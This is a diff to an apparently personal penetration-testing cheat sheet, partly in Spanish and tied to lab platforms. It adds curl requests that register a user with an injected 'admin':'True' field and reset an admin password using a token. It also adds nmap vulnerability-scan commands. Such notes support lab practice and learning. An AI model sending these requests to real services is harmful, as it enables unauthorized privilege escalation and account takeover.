@@ -526,6 +526,21 @@ curl -I -X OPTIONS http://IP/Pagina/                                           /
  curl -s http://docker.hackthebox.eu:<puerto>/ -X POST -d hash=$(curl -s http://docker.hackthebox.eu:<puerto>/ -c cookie.txt | grep -oP "(?<=h3 align='center'>).*(?=</)" | tr -d "\n" | md5sum | tr -d -) -b cookie
 ```
 
+```c
+Login
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://IP:PORT/users/v1/login
+
+Register
+curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://IP:PORT/users/v1/register
+
+Login with token
+curl  \
+  'http://IP:PORT/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKTOKEN' \
+  -d '{"password": "pwned"}'
+```
+
 Wget admits 255 character
 Create 255 character files
 
@@ -2298,9 +2313,10 @@ Path of nmap scripts: /usr/share/nmap/scripts
 interesting scripts: 
     - smb-os-discovery.nse - Averiguar OS mediante SMB
     - dns-zone-transfer.nse - Transferencia de zona
-
+    - cd /usr/share/nmap/scripts/  cat script.db  | grep "\"vuln\""
 
 ```c
+nmap -sV -p 443 --script "vuln" IP
 nmap --script=dns-zone-transfer -p 53 <servidorDNS>
 nmap -v -p 139,445 --script smb-os-discovery IP  for SMB
 ```
